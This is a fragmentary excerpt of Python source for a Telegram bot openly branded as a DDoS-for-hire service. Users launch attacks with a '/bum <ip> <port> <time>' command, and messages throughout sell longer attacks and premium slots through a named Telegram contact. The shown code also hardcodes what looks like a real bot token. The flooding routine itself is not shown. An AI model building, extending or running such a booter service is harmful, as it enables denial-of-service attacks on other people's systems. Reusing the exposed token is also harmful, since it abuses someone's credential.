...
# ============ IN-MEMORY STORAGE ============
DATA_DIR = "bot_data_ankita"
os.makedirs(DATA_DIR, exist_ok=True)

# ============ CONFIGURATION ============
BOT_START_TIME = datetime.now()
BOT_TOKEN = "8632950723:AAHrCr3HhGlNh8KfY7bl1CuxLH1wY5JKoZQ"
BOT_OWNER = 1497181461
...
def set_feedback_required(user_id, username):
    # This stores the user in the shared JSON file
...
def is_feedback_pending(user_id):
    # This checks the shared JSON file
    data = load_json(FEEDBACK_REQUIRED_FILE, {})
...
def build_global_status_message(user_id):
    ...
    if active_attacks:
        ...
        response += "💤 use ''/bum ip port time'' to attack\n"
        response += "────────────────────────\n"
    ...
    if free_slots <= 0:
        ...
        response += f"<blockquote>🚀 Tired of waiting? Bypass slots and get instant power! Contact @Sanskari_Queen to buy premium.</blockquote>\n"
...
def request_access_command(message):
    ...
    if group_id in approved_groups:
        safe_send_message(message.chat.id, "✅ This group is already approved! You can use /bum command.", reply_to=message)
        return
...
def handle_attack(message):
    ...
    if is_private_chat(message):     
        ...
        safe_send_message(message.chat.id, "❌ This Bot if for Free Group,\nContact Owner for personal Bot- @Sanskari_Queen", reply_to=message)
        return
    ...
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /bum <ip> <port> <time>\nTime: 10 to 140 seconds", reply_to=message)
        return
    ...
    try:
        ...
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s. more attack time and low cooldown and powerful ddos DM - @Sanskari_Queen", reply_to=message)
            return
        ...
        # INSIDE your /bum function, after successful validation:
        ...
        with _attack_lock:
            ...
            # Look for this inside your /bum handler
        username = message.from_user.username
...
⚡ ATTACK SETTINGS:
• /bum <ip> <port> <time> - Attack (min 10s)
...
• /bum <ip> <port> <time> - Start an attack (min 10s)

DDOS BOT OWNER - @Sanskari_Queen
'''
...
def unified_group_join_handler(message):
    ...
    for new_user in message.new_chat_members:
        ...
        welcome_text = f"Hello {clean_name}, welcome to the Universe of ANKITA."
...
# ============ BOT START ============
print("=" * 60)
print("🔥 ANKITA DDOS BOT STARTING...")
print("=" * 60)
